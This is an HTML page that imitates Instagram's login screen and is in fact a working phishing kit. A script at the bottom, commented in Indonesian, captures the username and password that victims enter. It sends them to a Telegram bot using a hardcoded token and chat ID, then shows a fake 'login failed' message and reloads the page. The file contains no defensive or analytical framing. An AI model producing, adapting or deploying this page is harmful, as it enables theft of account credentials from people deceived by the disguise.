<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: Arial, sans-serif;
    }
    .instagram-logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 3.5rem;
      color: #262626;
    }
  </style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between">
  <main class="flex flex-col items-center mt-20 px-6 sm:px-0">
    <h1 class="instagram-logo mb-8 select-none">Instagram</h1>
    <form id="loginForm" class="w-full max-w-xs flex flex-col gap-3">
      <input
        type="text"
        id="username"
        placeholder="Phone number, username, or email"
        class="border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500"
      />
      <input
        type="password"
        id="password"
        placeholder="Password"
        class="border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500"
      />
      <button
        type="submit"
        class="bg-blue-500 hover:bg-blue-600 text-white font-semibold text-sm rounded-sm py-2 mt-1"
      >
        Log in
      </button>
    </form>

    <div class="flex items-center w-full max-w-xs my-4">
      <hr class="flex-grow border-t border-gray-300" />
      <span class="mx-3 text-xs font-semibold text-gray-400 select-none">OR</span>
      <hr class="flex-grow border-t border-gray-300" />
    </div>

    <button type="button" class="flex items-center text-blue-600 font-semibold text-sm space-x-2">
      <i class="fab fa-facebook-square text-lg"></i>
      <span>Log in with Facebook</span>
    </button>

    <a href="#" class="mt-4 text-xs text-blue-600 hover:underline select-none">Forgot password?</a>

    <p class="mt-6 text-xs text-center text-gray-800 select-none">
      Don't have an account?
      <a href="#" class="text-blue-600 font-semibold hover:underline">Sign up</a>
    </p>
  </main>

  <footer class="text-center text-xs text-gray-500 py-6 px-4 select-none">
    <nav class="flex flex-wrap justify-center gap-x-2 gap-y-1 max-w-4xl mx-auto">
      <a href="#" class="hover:underline">Meta</a>
      <a href="#" class="hover:underline">About</a>
      <a href="#" class="hover:underline">Blog</a>
      <a href="#" class="hover:underline">Jobs</a>
      <a href="#" class="hover:underline">Help</a>
      <a href="#" class="hover:underline">API</a>
      <a href="#" class="hover:underline">Privacy</a>
      <a href="#" class="hover:underline">Terms</a>
      <a href="#" class="hover:underline">Locations</a>
      <a href="#" class="hover:underline">Instagram Lite</a>
      <a href="#" class="hover:underline">Threads</a>
      <a href="#" class="hover:underline">Contact Uploading &amp; Non-Users</a>
      <a href="#" class="hover:underline">Meta Verified</a>
      <a href="#" class="hover:underline">Meta in Indonesia</a>
    </nav>
  </footer>

  <!-- Script buat kirim data ke Telegram -->
  <script>
    const TOKEN = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; // Ganti sama token bot kamu
    const CHAT_ID = '-4545188605'; // Ganti sama chat ID kamu

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const text = `ðŸ”” Instagram Clone Login Attempt:\n\nðŸ‘¤ Username: ${username}\nðŸ”’ Password: ${password}`;

      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      }).then(response => {
        if (response.ok) {
          alert('Login gagal, silakan cek kembali username atau password.');
          window.location.reload();
        } else {
          alert('Error mengirim data.');
        }
      }).catch(error => {
        alert('Network error.');
      });
    });
  </script>

</body>
</html>
